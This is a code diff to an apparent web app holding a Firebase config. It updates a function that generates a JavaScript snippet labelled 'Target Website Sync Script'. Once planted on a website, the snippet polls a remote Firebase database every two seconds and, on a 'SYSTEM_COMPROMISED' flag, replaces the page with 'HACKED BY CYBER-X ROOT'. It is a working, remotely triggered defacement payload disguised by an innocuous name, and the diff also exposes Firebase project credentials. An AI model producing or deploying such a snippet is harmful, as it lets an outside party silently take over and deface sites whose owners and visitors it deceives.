@@ -412,7 +412,7 @@
         const firebaseConfig = {
             apiKey: "AIzaSyCoJIzAVmrty3GddH7X5s5gSeYnMuOsGRk",
             authDomain: "ad26-8b064.firebaseapp.com",
-            databaseURL: "https://ad26-8b064-default-rtdb.firebaseio.com",
+            databaseURL: "https://ad26-8b064-default-rtdb.asia-southeast1.firebasedatabase.app",
             projectId: "ad26-8b064",
             storageBucket: "ad26-8b064.firebasestorage.app",
             messagingSenderId: "600044263940",
@@ -565,7 +565,7 @@
         }
 
         window.generatePayloadScript = function() {
-            const snippet = `<!-- Target Website Sync Script -->\n<script>\n  const pId = "${firebaseConfig.projectId}";\n  setInterval(() => {\n    fetch(\`https://\${pId}-default-rtdb.firebaseio.com/nexus_bank/status.json\`)\n    .then(r => r.json()).then(d => {\n      if(d && d.status === "SYSTEM_COMPROMISED") document.body.innerHTML = "<h1 style='color:red;text-align:center;font-size:3rem;margin-top:25vh;'>HACKED BY CYBER-X ROOT</h1>";\n    });\n  }, 2000);\n<\/script>`;
+            const snippet = `<!-- Target Website Sync Script -->\n<script>\n  const pId = "${firebaseConfig.projectId}";\n  setInterval(() => {\n    fetch(\`https://\${pId}-default-rtdb.asia-southeast1.firebasedatabase.app/nexus_bank/status.json\`)\n    .then(r => r.json()).then(d => {\n      if(d && d.status === "SYSTEM_COMPROMISED") document.body.innerHTML = "<h1 style='color:red;text-align:center;font-size:3rem;margin-top:25vh;'>HACKED BY CYBER-X ROOT</h1>";\n    });\n  }, 2000);\n<\/script>`;
             document.getElementById('rtdb-data-view').innerText = snippet;
             printTerminal(`\n[GENERATE] Payload sync snippet generated for enterprise child websites.\n`);
         }
